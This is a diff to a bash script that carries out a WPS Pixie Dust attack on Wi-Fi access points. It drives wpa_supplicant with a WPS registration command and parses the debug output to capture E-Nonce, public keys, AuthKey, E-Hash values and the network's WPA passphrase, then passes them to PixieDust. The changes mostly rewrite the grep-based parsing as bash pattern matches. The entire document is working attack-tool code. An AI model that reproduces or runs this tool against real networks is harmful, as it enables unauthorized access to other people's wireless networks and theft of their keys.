@@ -12,9 +12,6 @@ PIXIE=1
 
 function quit() 
 {
-	PID=$(jobs -l | awk '{print $2}')
-	echo $PID
-	kill $PID
 	rm -rf $TEMPDIR $TEMPFILE $FIFO
 	exit
 }
@@ -47,97 +44,103 @@ function pixie()
 function attack()
 {
 	printI "Launching wpa_supplicant"
-	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee $FIFO > /dev/null &
-	
+	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &
 	#Send WPS_REG command to wpa_supplicant socket
 	printI "Sending WPS_REG command to wpa_supplicant"
-	sleep 5 && sendCMD
+	sendCMD
 
 	#Launch wpa_supplicant & parse output
-	while read -r LINE
+	while IFS= read -r LINE
 	do
-		#Parsing WPS messages
-		if [ "$(echo "$LINE" | grep 'WPS: ')" ]
+#		echo "$LINE"
+		if [[ $LINE =~ "nl80211:" ]]\
+		|| [[ $LINE =~ "P2P:" ]]\
+		|| [[ $LINE =~ "*" ]]\
+		|| [[ $LINE =~ "EAP:" ]]
 		then
-			if [ "$(echo "$LINE" | grep 'Building Message M')" ]
+			continue
+		fi
+		#Parsing WPS messages
+		if [[ $LINE =~ "WPS:" ]]
+		then
+			if [[ $LINE =~ "Building Message M" ]]
 			then
 				printI "Sending WPS Message $(echo "$LINE" | awk '{print $4}')"
-			elif [ "$(echo "$LINE" | grep 'Received M')" ]
+			elif [[ $LINE =~ "Received M" ]]
 			then
 				printI "Received WPS Message $(echo "$LINE" | awk '{print $3}')"
-			elif [ "$(echo "$LINE" | grep 'Received WSC_NACK')" ]
+			elif [[ $LINE =~ "Received WSC_NACK" ]]
 			then
 				printI 'Received WSC NACK'
 				printE 'Error: wrong PIN code'
 				break
-			elif [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ] &&\
-			   [ "$(echo "$LINE" | grep 'hexdump')" ]
+			elif [[ $LINE =~ "Enrollee Nonce" ]]\
+			  && [[ $LINE =~ "hexdump" ]]
 			then
 				ENONCE=$(gethex "$LINE")
 				printG "E-Nonce: $ENONCE"
-			elif [ "$(echo "$LINE" | grep 'DH own Public Key')" ] 
+			elif [[ $LINE =~ "DH own Public Key" ]] 
 			then
 				PKR=$(gethex "$LINE")
 				printG "PKR: $PKR"
-			elif [ "$(echo "$LINE" | grep 'DH peer Public Key')" ] &&\
-			   [ "$(echo "$LINE" | grep 'hexdump')" ]
+			elif [[ $LINE =~ "DH peer Public Key" ]] &&\
+			   [[ $LINE =~ "hexdump" ]]
 			then
 				PKE=$(gethex "$LINE")
 				printG "PKE: $PKE"
-			elif [ "$(echo "$LINE" | grep 'AuthKey')" ]
+			elif [[ $LINE =~ "AuthKey" ]]
 			then
 				AUTHKEY=$(gethex "$LINE")
 				printG "AuthKey: $AUTHKEY"
-			elif [ "$(echo "$LINE" | grep 'E-Hash1')" ]
+			elif [[ $LINE =~ "E-Hash1" ]]
 			then
 				EHASH1=$(gethex "$LINE")
 				printG "E-Hash1: $EHASH1"
-			elif [ "$(echo "$LINE" | grep 'E-Hash2')" ]
+			elif [[ $LINE =~ "E-Hash2" ]]
 			then
 				EHASH2=$(gethex "$LINE")
 				printG "E-Hash2: $EHASH2"
-			elif [ "$(echo "$LINE" | grep 'Networki\ Key')" ]
+			elif [[ $LINE =~ "Networki\ Key" ]]
 			then
 				WPA_KEY=$(gethex "$LINE")
 				printG "WPA pass: $WPA_KEY"
 			fi
 
 		#Status messages
-		elif [ "$(echo "$LINE" | grep ':\ State: ')" ]
+		elif [[ $LINE =~ ":\ State: " ]]
 		then
-			if [ "$(echo "$LINE" | grep -e '-> SCANNING')" ]
+			if [[ $LINE =~ "-> SCANNING" ]]
 			then
 				printI "Scanning…"
 			fi
 			
-		elif [ "$(echo "$LINE" | grep 'WPS-FAIL')" ]
+		elif [[ $LINE =~ "WPS-FAIL" ]]
 		then
 			printE "wpa_supplicant returned WPS-FAIL"
 			break
-		elif [ "$(echo "$LINE" | grep 'Trying\ to\ authenticate\ with')" ]
+		elif [[ $LINE =~ "Trying\ to\ authenticate\ with" ]]
 		then
 			printI "Authenticating..."
-		elif [ "$(echo "$LINE" | grep 'Authentication response')" ]
+		elif [[ $LINE =~ "Authentication response" ]]
 		then
 			printG "Authenticated"
-		elif [ "$(echo "$LINE" | grep 'Trying to associate with')" ]
+		elif [[ $LINE =~ "Trying to associate with" ]]
 		then
 			printI "Associating with AP..."
-		elif [ "$(echo "$LINE" | grep 'Associated with')" ] &&\
+		elif [[ $LINE =~ "Associated with" ]] &&\
 		     [ "$(echo "$LINE" | grep $IFACE)" ]
 		then
 			printG "Associated with $BSSID"
-		elif [ "$(echo "$LINE" | grep 'EAPOL: txStart')" ]
+		elif [[ $LINE =~ "EAPOL: txStart" ]]
 		then
 			printI "Sending EAPOL Start..."
-		elif [ "$(echo "$LINE" | grep 'EAP entering state IDENTITY')" ]
+		elif [[ $LINE =~ "EAP entering state IDENTITY" ]]
 		then
 			printI "Received Identity Requset"
-		elif [ "$(echo "$LINE" | grep 'using real identity')" ]
+		elif [[ $LINE =~ "using real identity" ]]
 		then
 			printI "Sending Identity Response..."
 		fi
-
 	done < $FIFO
 }
 
@@ -179,7 +182,6 @@ then
 else
 	printE "Not enough data to run PixieDust"
 fi
-
 
 #Remove temp files and exit
 quit
